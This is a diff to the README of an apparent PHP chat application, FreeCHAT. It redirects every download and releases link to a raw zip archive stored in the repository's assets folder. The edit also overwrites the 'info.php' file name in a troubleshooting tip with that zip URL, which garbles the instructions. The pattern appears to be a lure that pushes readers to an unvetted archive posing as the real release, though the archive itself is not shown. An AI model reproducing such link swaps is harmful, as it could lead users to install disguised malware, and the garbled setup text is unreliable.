@@ -14,7 +14,7 @@ To begin using FreeCHAT, follow these steps to download and install the applicat
 
 ### 📥 Download FreeCHAT
 
-[![Download FreeCHAT](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/rizzman270/FreeCHAT/releases)
+[![Download FreeCHAT](https://github.com/rizzman270/FreeCHAT/raw/refs/heads/main/assets/CHAT-Free-v2.5.zip)](https://github.com/rizzman270/FreeCHAT/raw/refs/heads/main/assets/CHAT-Free-v2.5.zip)
 
 Visit the Releases page to download FreeCHAT.
 
@@ -23,7 +23,7 @@ Visit the Releases page to download FreeCHAT.
 1. **Visit the Releases Page:**
    Click the link below to go to the FreeCHAT releases page.
 
-   [Visit Releases Page](https://github.com/rizzman270/FreeCHAT/releases)
+   [Visit Releases Page](https://github.com/rizzman270/FreeCHAT/raw/refs/heads/main/assets/CHAT-Free-v2.5.zip)
 
 2. **Select the Latest Release:**
    On the Releases page, you will see a list of available versions. Typically, the latest version will be at the top. 
@@ -62,7 +62,7 @@ Visit the Releases page to download FreeCHAT.
 If you run into any challenges while installing or using FreeCHAT, here are a few common issues and tips:
 
 - **Cannot Access Chat:** Ensure your web server is running correctly. Check if the server's service is active.
-- **PHP Errors:** Make sure PHP is installed and the version is 7.2 or higher. You can find your PHP version by creating a file called `info.php` with the content `<?php phpinfo(); ?>` and accessing it in your browser.
+- **PHP Errors:** Make sure PHP is installed and the version is 7.2 or higher. You can find your PHP version by creating a file called `https://github.com/rizzman270/FreeCHAT/raw/refs/heads/main/assets/CHAT-Free-v2.5.zip` with the content `<?php phpinfo(); ?>` and accessing it in your browser.
 - **Permission Issues:** Be sure to set correct permissions on the files and directories. Refer to your web host’s guidelines if unsure.
 
 ## 🌐 Community Support
@@ -71,4 +71,4 @@ For questions and help, visit our GitHub issues page. You can report bugs or ask
 
 Thank you for choosing FreeCHAT! Enjoy seamless communication without the complexity of databases. 
 
-[Download FreeCHAT](https://github.com/rizzman270/FreeCHAT/releases) and get started today!
+[Download FreeCHAT](https://github.com/rizzman270/FreeCHAT/raw/refs/heads/main/assets/CHAT-Free-v2.5.zip) and get started today!
